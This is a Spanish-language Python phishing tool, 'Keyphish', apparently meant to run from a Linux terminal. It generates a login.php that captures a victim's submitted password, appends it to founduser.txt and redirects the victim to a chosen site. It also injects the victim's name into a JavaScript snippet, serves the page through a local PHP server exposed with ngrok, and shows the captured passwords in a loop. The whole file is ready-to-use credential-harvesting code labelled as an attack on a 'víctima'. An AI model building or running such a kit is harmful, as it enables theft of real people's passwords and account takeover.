#-*-coding: utf-8 -*-
## Módulos a importar
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def logo():
    print('      ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗')
    print('      ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗██║░░██║██║██╔════╝██║░░██║')
    print('      █████═╝░█████╗░░░╚████╔╝░██████╔╝███████║██║╚█████╗░███████║')
    print('      ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║')
    print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
    print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
    print('                                              By Mr.Star')

def cambiarn():
    escribir= open('usuario.txt', 'w')
    print('''Debe poner el nombre entre comillas ejemplo:
    "Anonimo"     1- Atrás\n''')
    y=input('Ingrese el nombre de la víctima: ')
    r=('''var insertotexto=""+ 
    "{} <br>";
    document.write(insertotexto);'''.format(y))
    escribir.write(r)
    if y==1:
         clearConsole()
         os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")

def contra():
    archivo = open('founduser.txt','w')
    archivo.close()
    while True:
        time.sleep(2)
        clearConsole()
        logo()
        archiv= open('founduser.txt')
        print('Contraseñas:                Ctrl+c para salir')
        print(archiv.read())

def link():
    logo()
    escribir= open('login.php', 'w')
    print('''Debe poner el link entre comillas ejemplo:
    "https://facebook.com"    1- Atrás\n''')
    y=input('Inserte un link para redireccionar a la víctima: ')
    r=('''<?php
    $user = $_POST["pass"];
    $co = "===========================================\n"; 
    $cl = "===========================================\n";
    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
    $us = "Password: $user\n";
    fwrite($fileuser, "\n". $co. $us. $cl);
    fclose($fileuser);
    header('Location: {}');
    exit();
    ?>
    '''.format(y))
    escribir.write(r)
    if y==1:
        clearConsole()
        os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")


def ngrok():
    os.system("gnome-terminal -- php -S localhost:8080")
    os.system("gnome-terminal -- ngrok http 8080")
    clearConsole()
    contra()
    print("Las contraseñas estaran almacenadas en founduser.txt")

os.system("sudo apt install gnome-terminal php python3 python3-pip")
clearConsole()
os.system("pip install pyngrok")
clearConsole()
os.system("sudo pyngrok")
clearConsole()
print("         Instalación completa  ")
clearConsole()

logo()
y=int(input("""             Bienvenido desea:
1- Iniciar ataque
2- Ingresar nombre de la víctima
3- Ingresar link para redireccionar
4- Salir
$=  """))

if y==1:
    clearConsole()
    logo()
    ngrok()

elif y==2:
    cambiarn()
    clearConsole()

elif y==3:
    clearConsole()
    link()
    clearConsole()

elif y==4:
    print("  HASTA PRONTO!!")
    clearConsole()
